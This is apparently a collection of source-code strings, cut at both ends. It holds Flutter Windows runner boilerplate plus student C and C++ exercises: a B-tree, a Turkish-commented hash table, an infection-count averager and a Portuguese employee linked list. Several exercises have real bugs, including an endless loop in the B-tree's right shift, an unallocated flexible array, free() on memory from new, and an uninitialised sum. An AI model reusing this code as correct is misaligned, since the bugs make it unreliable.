registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <stdio.h>\r\n #include <stdlib.h>\r\n #define MAX 4\r\n #define MIN 2\r\n struct btreeNode {\r\n int val[MAX + 1], count;\r\n struct btreeNode *link[MAX + 1];\r\n };\r\n struct btreeNode *root;\r\n /* creating new node */\r\n struct btreeNode * createNode(int val, struct btreeNode *child) {\r\n struct btreeNode *newNode;\r\n newNode = (struct btreeNode *)malloc(sizeof(struct btreeNode));\r\n newNode->val[1] = val;\r\n newNode->count = 1;\r\n\r\n newNode->link[0] = root;\r\n newNode->link[1] = child;\r\n return newNode;\r\n }\r\n /* Places the value in appropriate position */\r\n void addValToNode(int val, int pos, struct btreeNode *node,\r\n struct btreeNode *child) {\r\n int j = node->count;\r\n while (j > pos) {\r\n node->val[j + 1] = node->val[j];\r\n node->link[j + 1] = node->link[j];\r\n j--;\r\n }\r\n node->val[j + 1] = val;\r\n node->link[j + 1] = child;\r\n node->count++;\r\n }\r\n /* split the node */\r\n void splitNode (int val, int *pval, int pos, struct btreeNode *node,\r\n struct btreeNode *child, struct btreeNode **newNode) {\r\n int median, j;\r\n if (pos > MIN)\r\n median = MIN + 1;\r\n else\r\n median = MIN;\r\n *newNode = (struct btreeNode *)malloc(sizeof(struct btreeNode));\r\n j = median + 1;\r\n while (j <= MAX) {\r\n (*newNode)->val[j - median] = node->val[j];\r\n (*newNode)->link[j - median] = node->link[j];\r\n\r\n j++;\r\n }\r\n node->count = median;\r\n (*newNode)->count = MAX - median;\r\n if (pos <= MIN) {\r\n addValToNode(val, pos, node, child);\r\n } else {\r\n addValToNode(val, pos - median, *newNode, child);\r\n }\r\n *pval = node->val[node->count];\r\n (*newNode)->link[0] = node->link[node->count];\r\n node->count--;\r\n }\r\n /* sets the value val in the node */\r\n int setValueInNode(int val, int *pval,\r\n struct btreeNode *node, struct btreeNode **child) {\r\n int pos;\r\n if (!node) {\r\n *pval = val;\r\n *child = NULL;\r\n return 1;\r\n }\r\n if (val < node->val[1]) {\r\n pos = 0;\r\n } else {\r\n for (pos = node->count;\r\n (val < node->val[pos] && pos > 1); pos--);\r\n if (val == node->val[pos]) {\r\n printf(\"Duplicates not allowed\\n\");\r\n return 0;\r\n\r\n }\r\n }\r\n if (setValueInNode(val, pval, node->link[pos], child)) {\r\n if (node->count < MAX) {\r\n addValToNode(*pval, pos, node, *child);\r\n } else {\r\n splitNode(*pval, pval, pos, node, *child, child);\r\n return 1;\r\n }\r\n }\r\n return 0;\r\n }\r\n /* insert val in B-Tree */\r\n void insertion(int val) {\r\n int flag, i;\r\n struct btreeNode *child;\r\n flag = setValueInNode(val, &i, root, &child);\r\n if (flag)\r\n root = createNode(i, child);\r\n }\r\n /* copy successor for the value to be deleted */\r\n void copySuccessor(struct btreeNode *myNode, int pos) {\r\n struct btreeNode *dummy;\r\n dummy = myNode->link[pos];\r\n for (;dummy->link[0] != NULL;)\r\n dummy = dummy->link[0];\r\n myNode->val[pos] = dummy->val[1];\r\n }\r\n /* removes the value from the given node and rearrange values */\r\n\r\n void removeVal(struct btreeNode *myNode, int pos) {\r\n int i = pos + 1;\r\n while (i <= myNode->count) {\r\n myNode->val[i - 1] = myNode->val[i];\r\n myNode->link[i - 1] = myNode->link[i];\r\n i++;\r\n }\r\n myNode->count--;\r\n }\r\n /* shifts value from parent to right child */\r\n void doRightShift(struct btreeNode *myNode, int pos) {\r\n struct btreeNode *x = myNode->link[pos];\r\n int j = x->count;\r\n while (j > 0) {\r\n x->val[j + 1] = x->val[j];\r\n x->link[j + 1] = x->link[j];\r\n }\r\n x->val[1] = myNode->val[pos];\r\n x->link[1] = x->link[0];\r\n x->count++;\r\n x = myNode->link[pos - 1];\r\n myNode->val[pos] = x->val[x->count];\r\n myNode->link[pos] = x->link[x->count];\r\n x->count--;\r\n return;\r\n }\r\n /* shifts value from parent to left child */\r\n void doLeftShift(struct btreeNode *myNode, int pos) {\r\n int j = 1;\r\n struct btreeNode *x = myNode->link[pos - 1];\r\n\r\n x->count++;\r\n x->val[x->count] = myNode->val[pos];\r\n x->link[x->count] = myNode->link[pos]->link[0];\r\n x = myNode->link[pos];\r\n myNode->val[pos] = x->val[1];\r\n x->link[0] = x->link[1];\r\n x->count--;\r\n while (j <= x->count) {\r\n x->val[j] = x->val[j + 1];\r\n x->link[j] = x->link[j + 1];\r\n j++;\r\n }\r\n return;\r\n }\r\n /* merge nodes */\r\n void mergeNodes(struct btreeNode *myNode, int pos) {\r\n int j = 1;\r\n struct btreeNode *x1 = myNode->link[pos], *x2 = myNode->link[pos - 1];\r\n x2->count++;\r\n x2->val[x2->count] = myNode->val[pos];\r\n x2->link[x2->count] = myNode->link[0];\r\n while (j <= x1->count) {\r\n x2->count++;\r\n x2->val[x2->count] = x1->val[j];\r\n x2->link[x2->count] = x1->link[j];\r\n j++;\r\n }\r\n j = pos;\r\n while (j < myNode->count) {\r\n myNode->val[j] = myNode->val[j + 1];\r\n\r\n myNode->link[j] = myNode->link[j + 1];\r\n j++;\r\n }\r\n myNode->count--;\r\n free(x1);\r\n }\r\n /* adjusts the given node */\r\n void adjustNode(struct btreeNode *myNode, int pos) {\r\n if (!pos) {\r\n if (myNode->link[1]->count > MIN) {\r\n doLeftShift(myNode, 1);\r\n } else {\r\n mergeNodes(myNode, 1);\r\n }\r\n } else {\r\n if (myNode->count != pos) {\r\n if(myNode->link[pos - 1]->count > MIN) {\r\n doRightShift(myNode, pos);\r\n } else {\r\n if (myNode->link[pos + 1]->count > MIN) {\r\n doLeftShift(myNode, pos + 1);\r\n } else {\r\n mergeNodes(myNode, pos);\r\n }\r\n }\r\n } else {\r\n if (myNode->link[pos - 1]->count > MIN)\r\n doRightShift(myNode, pos);\r\n else\r\n mer",
    "//ikinci k\u0131s\u0131m \r\n#include<stdio.h>\r\n#include<stdlib.h>\r\n#include<string.h>\r\n#define tablo_boyutu adet\r\nint adet = 5;\r\ntypedef struct Liste {\r\n\tint index;\r\n\tint link;\r\n\tint musteri_numarasi;\r\n\tchar musteri_ad[100];\r\n\tchar musteri_soyad[100];\r\n} Row;\r\n\r\ntypedef struct tablo {\r\n\tRow satirlar[];\r\n} Tablo;\r\n\r\nTablo Tablolar;\r\n\r\nvoid initialize() { //Olu\u015fturulan listeye -1 de\u011ferlerini atad\u0131m\r\n\tfor(int i = 0; i < tablo_boyutu; i++){\r\n\t    Tablolar.satirlar[i].index = -1;\r\n\t\tTablolar.satirlar[i].musteri_numarasi = -1;\r\n\t\tTablolar.satirlar[i].link = -1;\r\n\t}\r\n}\r\n\r\nint hash(int numara){ //Mod \u0130\u015flemini yapt\u0131\u011f\u0131m fonksiyon\r\n\treturn (numara % tablo_boyutu);\r\n}\r\n\r\nvoid ekle(int musteri_numarasi, char * musteri_ad, char * musteri_soyad) { \r\n\tint adres = hash(musteri_numarasi), gecici = adres; //adres de\u011fi\u015fkenine m\u00fc\u015fteri numaras\u0131n\u0131n modunu al\u0131p atad\u0131m.\r\n\tif(Tablolar.satirlar[adres].index == -1){ //e\u011fer listedeki index bo\u015fsa(-1 ise) fonksiyona parametre olarak gelen de\u011ferleri atad\u0131m.\r\n\t\tTablolar.satirlar[adres].index=adres;\r\n\t\tTablolar.satirlar[adres].musteri_numarasi = musteri_numarasi;\r\n\t\tstrcpy(Tablolar.satirlar[adres].musteri_ad, musteri_ad);\r\n\t\tstrcpy(Tablolar.satirlar[adres].musteri_soyad, musteri_soyad);\r\n\t}\r\n\telse {\r\n\t\tint gecici_boyut = 0, gecici_boyut2 = 0;\r\n\t\tadres = 0;\r\n\t\twhile(gecici_boyut != tablo_boyutu){ //s\u0131r\u0131dan ba\u015flat\u0131p t\u00fcm listeyi gezen while d\u00f6ng\u00fcs\u00fc\r\n\t\t\tif(Tablolar.satirlar[adres].index == -1){ //0. indexteki bo\u015fsa parametre olarak gelenleri e\u015fitliyorum.\r\n\t\t\t\tTablolar.satirlar[adres].index = adres;\r\n\t\t\t\tTablolar.satirlar[adres].musteri_numarasi = musteri_numarasi;\r\n\t\t\t\tstrcpy(Tablolar.satirlar[adres].musteri_ad, musteri_ad);\r\n\t\t\t\tstrcpy(Tablolar.satirlar[adres].musteri_soyad, musteri_soyad);\r\n\t\t\t\tif(Tablolar.satirlar[gecici].link == -1){ //E\u011fer listenin linki bo\u015fsa gecicideki linke o an adresteki linki at\u0131yorum.\r\n\t\t\t\t\tTablolar.satirlar[gecici].link = Tablolar.satirlar[adres].index;\r\n\t\t\t\t\treturn;\r\n\t\t\t\t}\r\n\t\t\t\telse { \r\n\t\t\t\t\twhile(gecici_boyut2 != tablo_boyutu - 1){\r\n\t\t\t\t\t\tif(hash(Tablolar.satirlar[gecici_boyut2].musteri_numarasi) == gecici && Tablolar.satirlar[gecici_boyut2].link == -1){ //gecici olarak yeniden atad\u0131\u011f\u0131m 0 de\u011ferindeki m\u00fc\u015fteri numaras\u0131n\u0131 hash fonksiyonuna g\u00f6nderdim. d\u00f6nen de\u011fer ile o indexteki link bo\u015fsa ona ba\u011flad\u0131m.\r\n\t\t\t\t\t\t\tTablolar.satirlar[gecici_boyut2].link = Tablolar.satirlar[adres].index;\r\n\t\t\t\t\t\t\tprintf(\"Tum Musteriler Basariyla Eklendi!\\n\");\r\n\t\t\t\t\t\t\treturn;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\tgecici_boyut2++;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tprintf(\"Hata Olustu! Musteri Eklenemedi!\\n\");\t\t\t\t\t\t\r\n\t\t\t\t}\t\t\t\t\r\n\t\t\t\treturn;\r\n\t\t\t}\r\n\t\t\tadres++;\r\n\t\t\tgecici_boyut++;\r\n\t\t}\r\n\t\tprintf(\"Tablo Dolu!\\n\");\r\n\t\treturn;\r\n\t}\r\n}\r\n\r\nint ara(int musteri_numarasi){\r\n\tint adres = hash(musteri_numarasi), gecici = adres, sayac = 0;\r\n\tif(Tablolar.satirlar[adres].musteri_numarasi == musteri_numarasi){ //E\u011fer arad\u0131\u011f\u0131m\u0131z de\u011fer ilk listede yani direk bulabiliyorsak buras\u0131 \u00e7al\u0131\u015f\u0131yor.\r\n\t\tprintf(\"%d Numarali Musteri %d Adimda Bulundu!\\n\", musteri_numarasi, ++sayac);\r\n\t\treturn 0;\r\n\t}\r\n\telse {\t\r\n\t\tint gecici_boyut = 0;\r\n\t\twhile(gecici_boyut != tablo_boyutu){\r\n\t\t\tsayac++;\r\n\t\t\tif(Tablolar.satirlar[Tablolar.satirlar[adres].link].musteri_numarasi == musteri_numarasi){ //e\u011fer linke g\u00f6re arama yapmak gerekirse buras\u0131 \u00e7al\u0131\u015f\u0131yor. adresteki linke bak\u0131p gelen de\u011fer ayn\u0131 m\u0131 diye kontrol ediyor. de\u011filse di\u011fer adrese y\u00fckseltiyorum.\r\n\t\t\t\tprintf(\"%d Numarali Musteri %d Adimda Bulundu!\\n\", musteri_numarasi, sayac);\r\n\t\t\t\treturn 0;\r\n\t\t\t}\r\n\t\t\tif(hash(Tablolar.satirlar[gecici_boyut].musteri_numarasi) == gecici){ //linke g\u00f6re arama yapt\u0131\u011f\u0131m\u0131zda \u00f6nceki linki takip edebilmek i\u00e7in adresi g\u00fcncelliyorum.\r\n\t\t\t\tadres = gecici_boyut;\r\n\t\t\t}\r\n\t\t\tgecici_boyut++;\r\n\t\t}\r\n\t\tprintf(\"Aradiginiz Musteri Bulunamadi!\\n\");\r\n\t\treturn -1;\r\n\t}\r\n}\r\n\r\nvoid listele(){\r\n\tprintf(\"Index\\tNumara\\tAdi\\tSoyadi\\tLink\\n\");\r\n\tprintf(\"--------------------------------------\\n\");\r\n \tfor(int i = 0; i < tablo_boyutu; i++){\r\n\t\tprintf(\"%d \\t\", i);\r\n\t\tprintf(\"%d \\t\", Tablolar.satirlar[i].musteri_numarasi);\r\n\t\tprintf(\"%s \\t\", Tablolar.satirlar[i].musteri_ad);\r\n\t\tprintf(\"%s \\t\", Tablolar.satirlar[i].musteri_soyad);\r\n\t\tprintf(\"%d \\t\", Tablolar.satirlar[i].link); \t\t\t\r\n\t\tprintf(\"\\n\");\r\n\t}\r\n}\r\n\r\nint main(){\r\n\tprintf(\"Uygulama 2\\n\");\r\n\tprintf(\"Tablo Boyutu Giriniz: \");\r\n\tscanf(\"%d\", &adet);\r\n\ttablo_boyutu = adet;\r\n\tinitialize();\r\n\tekle(10, \"faruk\", \"ipek\");\r\n\tekle(13, \"tarik\", \"cakir\");\r\n\tekle(23, \"ahmet\", \"yilmaz\");\r\n\tekle(18, \"kemal\", \"demir\");\r\n\tekle(12, \"aa\",\"a\");\r\n\tekle(20,\"GF\",\"GG\");\r\n\tprintf(\"--------------------------------------\\n\");\r\n\tlistele();\r\n\tprintf(\"--------------------------------------\\n\");\r\n\tara(18);\r\n\tara(12);\r\n}\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"blog_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//A program that keeps track of the infected people around the world\r\n#include <iostream>\r\nusing namespace std;\r\nint main ()\r\n{\r\n\tint countries, infected;\r\n\tfloat sum, average;\r\n\r\n\t\r\n\tcout << \"This is a program that keeps track of the infected people around the world\" << endl << endl;\r\n\t\r\n\t\r\n\tcout << \"Enter the number of the countries: \"; // stores the number of countries (the number of times the loop will continue)\r\n\tcin >> countries;\r\n\t\r\n\t\t// create an array that stores each name of each country and the number of infected people in these countries\r\n\tstring array[countries];\r\n\tint arr[countries];\r\n\r\n\r\n\r\n\tfor (int i = 0; i < countries; i++)\r\n\t{\r\n\t\tcout << \"Enter name of country number \" << i + 1 << \" and the number of infected people in it: \";\r\n\t\tcin >> array[i];\r\n\t\tcin >> arr[i];\r\n\t\tcout << endl;\r\n\t\t\r\n    }\r\n\t\r\n\tcout << endl << endl;\r\n\r\n\r\n    // create a loop to be able to sum the total number of cases for all countries\r\n    for (int s = 0; s < countries; s++)\r\n    {\r\n    \tsum+=arr[s];\r\n\t}\r\n\tcout << \"The total number of infected cases for all countries is: \" << sum << endl;\r\n\t\r\n\t\r\n\t// get the average by dividing the sum of cases and the total number of values\r\n\taverage = sum/countries;\r\n\tcout << \"The average infections for all countries is: \" << average << endl;\r\n\t\r\n\tint max = arr[0];\r\n\t// create a loop to be able to find the highest number of infection\r\n    for(int m = 1; m < countries; m++)\r\n    {\r\n    \t\r\n\r\n       if(max < arr[m]) \r\n       {\r\n       \t  max = arr[m]; \r\n\t   }\r\n\r\n    }\r\n    cout << \"The highest number of infections is: \" << max; \r\n\t\r\n\t\r\n\treturn 0;\r\n}\r\n",
    "#include <iostream>\n#include <locale.h>\n#include <string>\nusing namespace std;\n\nstruct Funcionario {\n\tint prontuario;\n\tstring nome;\n\tdouble salario;\n\tFuncionario *prox;\n};\n\nFuncionario* init() {\n\treturn NULL;\n}\n\nbool isEmpty(Funcionario* lista) {\n\treturn (lista == NULL);\n}\n\nFuncionario* insert(Funcionario* lista, int prontuario, string nome, double salario) {\n\tFuncionario* novo = new Funcionario();\n\tnovo->prontuario = prontuario;\n\tnovo->nome = nome;\n\tnovo->salario = salario;\n\tnovo->prox = lista;\n\treturn novo;\n};\n\nvoid printLista(Funcionario* lista) {\n\tFuncionario* aux;\n\tstring line(20, '-');\n\taux = lista;\n\tdouble totalSalarios = 0;\n\tif (isEmpty(lista)) {\n\t\tcout << \"Lista vazia.\" << endl;\n\t} else {\n\t\tcout << \"Lista de funcion\u00e1rios: \\n\" << endl;\n\t\tcout << line << endl;\n\t\twhile (aux != NULL) {\n\t\t\tcout << \"Prontu\u00e1rio: \" << aux->prontuario << endl;\n\t\t\tcout << \"Nome: \" << aux->nome << endl;\n\t\t\tcout << \"Sal\u00e1rio: \" << aux->salario << endl;\n\t\t\tcout << line << endl;\n\t\t\ttotalSalarios = totalSalarios + aux->salario;\n\t\t\taux = aux->prox;\n\t\t}\n\t\tcout << \"\\nTotal de sal\u00e1rios: \" << totalSalarios << endl;\n\t\tcout << \"\\nFim da lista.\" << endl;\n\t}\n}\n\nvoid printFuncionario(Funcionario* lista, int prontuario) {\n\tFuncionario* aux;\n\taux = lista;\n\twhile (aux != NULL && aux->prontuario != prontuario) {\n\t\taux = aux->prox;\n\t}\n\tif (aux) {\n\t\tcout << \"\\nFuncion\u00e1rio encontrado: \" << endl;\n\t\tcout << endl;\n\t\tcout << \"Prontu\u00e1rio: \" << aux->prontuario << endl;\n\t\tcout << \"Nome: \" << aux->nome << endl;\n\t\tcout << \"Sal\u00e1rio: \" << aux->salario << endl;\n\t} else {\n\t\tcout << \"\\nFuncion\u00e1rio n\u00e3o encontrado.\" << endl;\n\t}\n}\n\nFuncionario* find(Funcionario* lista, int prontuario) {\n\tFuncionario* aux;\n\taux = lista;\n\twhile (aux != NULL && aux->prontuario != prontuario) {\n\t\taux = aux->prox;\n\t}\n\treturn aux;\n}\n\nFuncionario* remove(Funcionario* lista, int prontuario) {\n\tFuncionario* aux;\n\tFuncionario* ant = NULL;\n\taux = lista;\n\n\twhile (aux != NULL && aux->prontuario != prontuario) {\n\t\tant = aux;\n\t\taux = aux->prox;\n\t}\n\n\tif (aux == NULL) {\n\t\treturn lista;\n\t}\n\n\tif (ant == NULL) {\n\t\tlista = aux->prox;\n\t}\n\n\telse {\n\t\tant->prox = aux->prox;\n\t}\n\n\tfree(aux);\n\treturn lista;\n}\n\nvoid freeLista(Funcionario* lista) {\n\tFuncionario* aux;\n\taux = lista;\n\twhile (aux != NULL) {\n\t\tFuncionario *ant = aux->prox;\n\t\tfree(aux);\n\t\taux = ant;\n\t}\t\n}\n\nint main() {\n\tsetlocale(LC_ALL, \"\");\n\t\n  \tFuncionario *listaFuncionarios;\n\tlistaFuncionarios = init();\n\tint prontuario;\n\tstring nome;\n\tdouble salario;\n  \tint opcao;\n  \n  \tdo {\n\t\tstring line(40, '-');\n\t\tcout << \"0. Sair\\n\";\n\t\tcout << \"1. Incluir\\n\";\n\t\tcout << \"2. Excluir\\n\";\n\t\tcout << \"3. Pesquisar\\n\";\n\t\tcout << \"4. Listar\\n\";\n\t\tcout << \"Op\u00e7\u00e3o: \";\n\t\tcin >> opcao;\n\n    \t\tswitch (opcao) {\n\t\t\tcase 0:\n\t\t\t\tcout << line << endl;\n\t\t\t\tcout << \"Encerrando programa...\\n\";\n\t\t\t\tbreak;\n\t\t\t\n\t\t\tcase 1:\n\t\t\t\tcout << line << endl;\n        \t\t\tcout << \"Digite o prontuario: \";\n\t\t\t\tcin >> prontuario;\n\t\t\t\tif (find(listaFuncionarios, prontuario)) {\n\t\t\t\t\tcout << \"Funcion\u00e1rio j\u00e1 cadastrado!\\n\";\n\t\t\t\t\tcout << line << endl;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcout << \"Digite o nome: \";\n\t\t\t\tcin >> nome;\n        \t\t\tcout << \"Digite o salario: \";\n\t\t\t\tcin >> salario;\n\t\t\t\tlistaFuncionarios = insert(listaFuncionarios, prontuario, nome, salario);\n        \t\t\tcout << \"Funcion\u00e1rio cadastrado com sucesso!\" << endl;\n\t\t\t\tcout << line << endl;\n\t\t\tbreak;\n\n\t\t\tcase 2:\n\t\t\t\tcout << line << endl;\n\t\t\t\tcout << \"Digite o prontu\u00e1rio do funcion\u00e1rio a ser exclu\u00eddo: \";\n\t\t\t\tcin >> prontuario;\n\t\t\t\tlistaFuncionarios = remove(listaFuncionarios, prontuario);\n\t\t\t\tcout << \"Funcion\u00e1rio exclu\u00eddo com sucesso!\" << endl;\n\t\t\t\tcout << line << endl;\n\t\t\tbreak;\n\t\t\t\n\t\t\tcase 3:\n\t\t\t\tcout << line << endl;\n\t\t\t\tcout << \"Digite o prontu\u00e1rio do funcion\u00e1rio a ser pesquisado: \";\n\t\t\t\tcin >> prontuario;\n\t\t\t\tprintFuncionario(listaFuncionarios, prontuario);\n\t\t\t\tcout << line << endl;\n\t\t\tbreak;\n\n\t\t\tcase 4:\n\t\t\t\tcout << line << endl;\n\t\t\t\tprintLista(listaFuncionarios);\n\t\t\t\tcout << line << endl;\n\t\t}  \t\n  } while (opcao != 0);\n\n\tfreeLista(listaFuncionarios);\n\n\treturn 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"calculator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void 